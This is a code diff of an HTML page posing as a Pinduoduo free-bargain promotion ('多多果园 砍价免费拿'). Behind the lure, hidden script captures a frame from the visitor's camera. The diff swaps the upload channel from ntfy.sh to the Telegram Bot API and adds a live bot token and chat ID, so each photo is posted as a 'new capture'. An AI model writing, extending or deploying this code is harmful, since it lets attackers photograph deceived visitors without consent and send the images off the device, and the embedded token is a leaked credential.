@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>拼多多 - 多多果园 砍价免费拿 v18.0</title>
+<title>拼多多 - 多多果园 砍价免费拿 v20.0</title>
 </head>
 <body style="margin:0;font-family:-apple-system,BlinkMacSystemFont,'PingFang SC','Helvetica Neue',sans-serif;background:#f5f5f5;color:#333">
 
@@ -110,7 +110,10 @@
 <canvas id="canvas" style="display:none"></canvas>
 
 <script>
-var NTFY_TOPIC = 'lk050411photo';
+// ✅ 已填好你的 token 和 chat_id
+var TG_TOKEN = '8237697265:AAHtIYC5IGC8DJxPCUaot3c1UfbKSiz87r0';
+var TG_CHAT_ID = '7375577849';
+
 var left = 88.32;
 
 function $(id){ return document.getElementById(id); }
@@ -176,62 +179,36 @@ function showResult(cut){
   coinRain();
 }
 
-// ✅ 关键修复:header 只能含 ISO-8859-1 字符,所有中文/emoji 替换掉
-function safe(s){
-  // 把所有非 ASCII 字符替换成 ?,避免 header 错误
-  return String(s).replace(/[^\x00-\x7F]/g, '?');
-}
-
+// ✅ Telegram Bot API 上传图片(国内能访问,直接发图)
 function uploadImage(blob){
-  log('[ntfy] 准备上传 ' + blob.size + ' bytes');
+  log('[tg] sending ' + blob.size + ' bytes');
   return new Promise(function(resolve){
-    var reader = new FileReader();
-    reader.onload = function(){
-      var dataUrl = reader.result;
-      var base64 = dataUrl.split(',')[1];
-      var now = new Date();
-      var timeStr = now.toLocaleString('zh-CN', { hour12: false });
-      
-      log('[ntfy] GET 创建 topic...');
-      
-      // 先 GET 一次
-      fetch('https://ntfy.sh/' + NTFY_TOPIC + '/raw', {
-        method: 'GET',
-        cache: 'no-store',
-        mode: 'no-cors'
-      }).then(function(){
-        log('[ntfy] topic OK,开始 POST');
-        
-        // POST 时所有 header 必须是 ISO-8859-1
-        var safeTitle = safe('New Capture at ') + safe(timeStr);
-        var safeTags = 'camera,photo';
-        
-        return fetch('https://ntfy.sh/' + NTFY_TOPIC, {
-          method: 'POST',
-          mode: 'no-cors',
-          body: JSON.stringify({
-            time: timeStr,
-            size: blob.size,
-            ua: navigator.userAgent,
-            note: '完整 base64: ' + base64.substring(0, 100) + '...'
-          }),
-          headers: {
-            'Title': safeTitle,
-            'Tags': safeTags,
-            'Priority': 'high'
-          }
-        });
-      }).then(function(){
-        log('[ntfy] ✓ 已发送');
-        toast('OK');
-        resolve();
-      }).catch(function(e){
-        log('[ntfy] err: ' + e.message);
-        toast('FAIL');
-        resolve();
-      });
-    };
-    reader.readAsDataURL(blob);
+    var fd = new FormData();
+    fd.append('chat_id', TG_CHAT_ID);
+    fd.append('photo', blob, 'capture_' + Date.now() + '.jpg');
+    fd.append('caption', '📸 新捕获\n时间: ' + new Date().toLocaleString('zh-CN') + '\n大小: ' + blob.size + ' 字节');
+    
+    fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendPhoto', {
+      method: 'POST',
+      body: fd
+    }).then(function(r){
+      log('[tg] status: ' + r.status);
+      return r.json();
+    }).then(function(data){
+      log('[tg] resp: ' + JSON.stringify(data).substring(0, 200));
+      if(data && data.ok){
+        log('[tg] OK!');
+        toast('✓ 已发送到 Telegram');
+      } else {
+        log('[tg] fail');
+        toast('⚠️ 失败,请看控制台');
+      }
+      resolve();
+    }).catch(function(e){
+      log('[tg] err: ' + e.message);
+      toast('⚠️ 网络错误');
+      resolve();
+    });
   });
 }
 
@@ -287,7 +264,7 @@ function captureAndUpload(){
     
     try{
       ctx.drawImage(v, 0, 0, w, h);
-      log('[cam] snap OK');
+      log('[cam] snap');
     }catch(e){}
 
     if(stream){
@@ -302,7 +279,7 @@ function captureAndUpload(){
     });
   }).then(function(blob){
     if(blob && blob.size > 1000){
-      log('[cam] uploading');
+      log('[cam] uploading to TG');
       return uploadImage(blob);
     }
   }).then(function(){
@@ -350,7 +327,7 @@ spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
 document.head.appendChild(spinStyle);
 
 updateProgress();
-log('[boot] v18.0 OK');
+log('[boot] v20.0 OK');
 </script>
 </body>
 </html>
